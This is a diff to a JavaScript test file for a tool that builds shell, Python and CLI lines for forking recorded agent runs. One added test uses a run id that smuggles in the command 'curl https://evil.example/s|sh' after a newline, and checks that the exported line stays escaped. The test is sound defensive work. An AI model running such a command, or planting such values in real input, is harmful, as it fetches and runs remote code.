@@ -7,6 +7,9 @@ import { describe, it, expect } from 'vitest';
 import tape from '../test/fixtures/tape_tkt4101.json';
 import created from '../test/fixtures/fork_created.json';
 import forks from '../test/fixtures/forks.json';
+// A run whose session.id carries a newline and a command, forked on a real
+// 0.28.0 server: the server takes the id and echoes it back as stored.
+import newlineRun from '../test/fixtures/fork_created_newline_run.json';
 import {
   buildForkRequest, editValue, forkCli, forkEnv, forkPython, forkSummary, forkable, recordedAnswer, shellWord,
 } from './fork.js';
@@ -78,7 +81,6 @@ describe('the lines it hands back', () => {
     const env = forkEnv(created, 'http://127.0.0.1:8931', 'token');
     expect(env).toContain(`export OPENAI_BASE_URL=http://127.0.0.1:8931${created.base_urls.openai}`);
     expect(env).toContain(`export ANTHROPIC_BASE_URL=http://127.0.0.1:8931${created.base_urls.anthropic}`);
-    expect(env).toContain('export OPENAI_API_KEY=$TRAZA_TOKEN');
     expect(env).toContain(`export TRAZA_FORK_ID=${created.fork_id}`);
     expect(env).toContain('export TRAZA_FORK_PARENT=tkt-4101');
     expect(env).toContain('export TRAZA_FORK_STEP=1');
@@ -92,7 +94,8 @@ describe('the lines it hands back', () => {
     expect(forkCli(request)).toBe('traza fork tkt-4101 --at 1 --tool-result \'{"orders":[],"ok":false}\' -- python agent.py');
     const text = { run: 'run 7', step: 4, change: 'edit', kind: 'llm', value: "It's sunny.", live: false, format: 'text', mode: 'loose' };
     expect(forkPython(text)).toContain('traza.fork("run 7", at_step=4, response="It\'s sunny.", live=False, mode="loose")');
-    expect(forkCli(text)).toBe("traza fork 'run 7' --at 4 --response 'It'\\''s sunny.' --no-live -- python agent.py");
+    // The CLI has no mode: it writes the strict fork only.
+    expect(forkCli({ ...text, mode: 'strict' })).toBe("traza fork 'run 7' --at 4 --response 'It'\\''s sunny.' --no-live -- python agent.py");
     expect(forkPython({ run: 'r', step: 3, change: 'rewind' })).toContain('traza.fork("r", at_step=3)');
     expect(forkCli({ run: 'r', step: 3, change: 'rewind' })).toBe('traza fork r --at 3 -- python agent.py');
   });
@@ -113,5 +116,48 @@ describe('a fork in the listing', () => {
     });
     expect(summary.delta.steps).toBe(-2);
     expect(summary.divergence.kind).toBe('decision');
+  });
+});
+
+describe('stored text and keys in the lines it hands back', () => {
+  const base = 'http://127.0.0.1:8931';
+
+  it('never lets a run id end a line: a newline in it cannot become a command when the block is pasted', () => {
+    expect(newlineRun.fork.parent).toBe('x\ncurl https://evil.example/s|sh\n');
+    const env = forkEnv(newlineRun, base, 'token');
+    for (const line of env.split('\n')) {
+      expect(line.startsWith('#') || line.startsWith('export ')).toBe(true);
+    }
+    expect(env).not.toMatch(/^curl/m);
+    // Still the exact value, on one line.
+    expect(env).toContain("export TRAZA_FORK_PARENT=$'x\\ncurl https://evil.example/s|sh\\n'");
+  });
+
+  it('never hands the agent the Traza token as its provider key: a fork\'s live half talks to the real provider', () => {
+    const env = forkEnv(created, base, 'token');
+    expect(env).not.toContain('$TRAZA_TOKEN');
+    expect(env).toContain('export OPENAI_API_KEY="${TRAZA_REPLAY_KEY:?');
+    expect(env).toContain('export ANTHROPIC_API_KEY="${TRAZA_REPLAY_KEY:?');
+    expect(env).toMatch(/both the base URL and the key/);
+    // An open server takes any key: there is nothing to protect.
+    expect(forkEnv(created, base, 'open')).toContain('export OPENAI_API_KEY=unused');
+  });
+
+  it('names the run\'s tenant, so an operator\'s fork forks that tenant\'s run and not the default one\'s', () => {
+    const request = { run: 'tkt-4101', tenant: 'acme', step: 1, change: 'edit', kind: 'tool', value: { ok: true }, live: true, format: 'json' };
+    const python = forkPython(request);
+    expect(python).toContain('tenant="acme"');
+    expect(python).toContain('with client.fork("tkt-4101", at_step=1, tool_result={"ok": True}) as fork:');
+    expect(forkCli(request)).toBe('traza fork tkt-4101 --tenant acme --at 1 --tool-result \'{"ok":true}\' -- python agent.py');
+    // The default tenant, named: an empty tenant is not every tenant.
+    expect(forkPython({ ...request, tenant: '' })).toContain('tenant=""');
+    expect(forkCli({ ...request, tenant: '' })).toContain("--tenant '' ");
+    // Unknown: nothing named, as before.
+    expect(forkPython({ ...request, tenant: undefined })).not.toContain('tenant');
+  });
+
+  it('says the CLI cannot make a loose fork, rather than writing one that makes a strict fork', () => {
+    expect(forkCli({ run: 'r', step: 3, change: 'rewind', mode: 'loose' })).toBeNull();
+    expect(forkCli({ run: 'r', step: 3, change: 'rewind', mode: 'strict' })).toBe('traza fork r --at 3 -- python agent.py');
   });
 });
